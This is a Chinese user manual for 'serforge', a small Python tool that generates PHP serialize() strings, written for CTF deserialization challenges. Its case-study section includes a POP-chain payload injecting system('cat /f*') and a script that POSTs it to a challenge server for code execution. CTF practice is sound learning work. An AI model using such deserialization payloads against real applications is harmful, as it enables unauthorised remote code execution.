# serforge 使用说明书

> **Ser**ialize **Forge** —— 序列化锻造器。一个零依赖的 Python 小工具，用来快速、准确地生成 PHP `serialize()` 格式的字符串。

---

## 一、为什么需要它

手工构造 PHP 序列化串时，要数每个字符串的长度、手动拼 `\x00` 保护字节（protected / private 属性名里的隐藏字符），**极易数错一位就导致整个 payload 反序列化失败**。

serforge 按 PHP 规则 **自动算长度、自动处理 `\x00`**，你只管描述「我要什么对象 / 数组」，它负责产出正确的串。

---

## 二、位置与依赖

- **路径**：`my_learning/web/serforge.py`
- **依赖**：仅 Python 3（无需安装任何第三方包）
- **运行**：`python serforge.py <参数>`

---

## 三、三种用法

### 用法 A：命令行直接传 JSON（最常用）

- **构造对象**：JSON 顶层带 `"__class__":"类名"`，其余键即属性

  ```bash
  python serforge.py '{"__class__":"test","user":"test","pswd":"escaping"}'
  # 输出：O:4:"test":2:{s:4:"user";s:4:"test";s:4:"pswd";s:8:"escaping";}
  ```

- **构造数组**：直接传普通 JSON 对象（不带 `__class__`）

  ```bash
  python serforge.py '{"name":"bob","age":18}'
  # 输出：a:2:{s:4:"name";s:3:"bob";s:3:"age";i:18;}
  ```

### 用法 B：当库 import（写利用脚本时）

```python
from serforge import serialize, obj

payload = serialize(obj("test", user="test", pswd="escaping"))
# 也可混用普通类型：
serialize({"a": 1, "b": [1, 2, 3], "c": True})
```

### 用法 C：无参数运行看自测

```bash
python serforge.py
```

会依次演示 **对象 / 关联数组 / 索引数组 / protected / private** 的构造结果，适合新手建立直觉。

---

## 四、属性可见性规则（重点）

构造对象时，**属性键名的写法决定可见性**：

| 想表达的属性 | 键名写法 | PHP 里的实际属性名 |
|---|---|---|
| public（默认） | `"user"` | `user` |
| protected | `"*token"`（星号开头） | `\x00*\x00token` |
| private | `"User@secret"`（`类@属性`） | `\x00User\x00secret` |

示例：

```bash
python serforge.py '{"__class__":"User","*token":"abc","User@secret":"x"}'
# 输出：O:4:"User":2:{s:8:"%00*%00token";s:3:"abc";s:12:"%00User%00secret";s:1:"x";}
```

---

## 五、必须知道的坑：`\x00` 与 `%00`

protected / private 的属性名里有 **不可见的 `\x00` 字节**，PHP 靠它区分可见性。

- 终端打印时，工具会把 `\x00` 显示成 `%00`（「可复制 / URL 安全」版本），方便你复制进 URL。
- 放进 URL 参数时，`%00` 会被自动解码回 `\x00`，正好匹配 PHP 的要求——**别手删、别用空格替代**。
- 如果用 Python 脚本直接发 payload，用 `repr` 那版（含真实 `\x00` 字节）最稳；用 curl 则加 `--data-urlencode` 自动编码。

---

## 六、和 PHP 原生 `serialize()` 的关系

- **装了 PHP 的环境**（比赛机 / Docker）：首选 `php -r '$o=...; echo serialize($o);'`，PHP 自己生成的永远最准。
- **没装 PHP**（如本机）：用 serforge，已用真实 CTF 题验证输出与 PHP 一致。
- **复杂 POP 链**（魔法方法 `__wakeup` / `__destruct` 串联调用）：用专业工具 **phpggc**，不在本工具范围。

---

## 七、实战案例

### 7.1 单层对象（qsnctf 反序列化题 · 40507）

题目逻辑：`unserialize(filter($_GET['payload']))`，当对象的 `pswd == 'escaping'` 时 `echo $flag`。

一键生成 payload：

```bash
python serforge.py '{"__class__":"test","pswd":"escaping"}'
# O:4:"test":1:{s:4:"pswd";s:8:"escaping";}
```

把这段作为 `?payload=` 的值发出即可（黑名单 `flag`/`php` 不含这些词，放行）。本题已后台验证成功拿到 flag。

### 7.2 类嵌套类 / POP 链（qsnctf 反序列化题 · 40515）

这道题要造一个"套娃"对象：`GIT` 对象的 `password` 属性本身又是一个 `ZeroZone` 对象（属性值是另一个对象），从而串起 POP 链触发 `eval`。

> ⚠️ **命令行 JSON 模式不支持嵌套对象**：内层 dict 会被当成普通数组 `a:...`，得不到 `O:8:"ZeroZone":1:{...}`。这类"类里套类"的结构**必须用 import 方式（用法 B）**。

```python
from serforge import serialize, obj

# GIT.password 的值 = 一个 ZeroZone 对象（类嵌套类）
payload = serialize(
    obj("GIT",
        username="ZeroZone",
        password=obj("ZeroZone", code="system('cat /f*');"))
)
print(payload)
# O:3:"GIT":2:{s:8:"username";s:8:"ZeroZone";s:8:"password";O:8:"ZeroZone":1:{s:4:"code";s:18:"system('cat /f*');";}}
```

逐字段对照：

| 外层 `GIT` 对象 | 值 |
|---|---|
| `username` | `"ZeroZone"`（字符串，满足 `__destruct` 里的 if 才去 echo） |
| `password` | 一个 `ZeroZone` 对象 → `O:8:"ZeroZone":1:{...}` |

| 内层 `ZeroZone` 对象 | 值 |
|---|---|
| `code` | `"system('cat /f*');"`（即 `__toString` 里 `eval` 会执行的代码） |

生成后用 POST 发出（本题入口是 `$_POST['data']`，参数名 `data`）：

```python
import urllib.request, urllib.parse
from serforge import serialize, obj

payload = serialize(obj("GIT", username="ZeroZone",
                        password=obj("ZeroZone", code="system('cat /f*');")))
data = urllib.parse.urlencode({"data": payload}).encode()
req = urllib.request.Request("http://challenge.qsnctf.com:40515/serialize.php", data=data, method="POST")
print(urllib.request.urlopen(req, timeout=20).read().decode(errors="ignore"))
```

> 注：`obj()` 的属性值可以是任意已支持类型，包括 dict / list / 另一个 `obj()`。所以"类里套类"只需把内层 `obj(...)` 直接当属性值传进去，工具会自动递归生成正确的嵌套序列化串。

---

## 八、常见问题

**Q：输出的串里为什么有 `%00`？**
A：那是 protected / private 属性名里的隐藏 `\x00` 字节的 URL 安全写法，放进 URL 会被自动还原，不要删。

**Q：我想构造嵌套对象 / 数组可以吗？**
A：嵌套数组、嵌套 dict 在两种模式下都支持。但**嵌套对象（类里套类）必须用 import 方式**——命令行 JSON 模式下内层 dict 会被当成普通数组 `a:...`，得不到 `O:...` 对象。import 方式下 `obj()` 的属性值可以直接是另一个 `obj(...)`，工具会递归生成正确的嵌套串（完整示例见七·7.2）。

**Q：布尔 / 数字 / NULL 怎么表示？**
A：命令行 JSON 里 `true`/`false`/`null` 和数字会按 PHP 规则序列化为 `b:1;`/`b:0;`/`i:*`/`N;`。
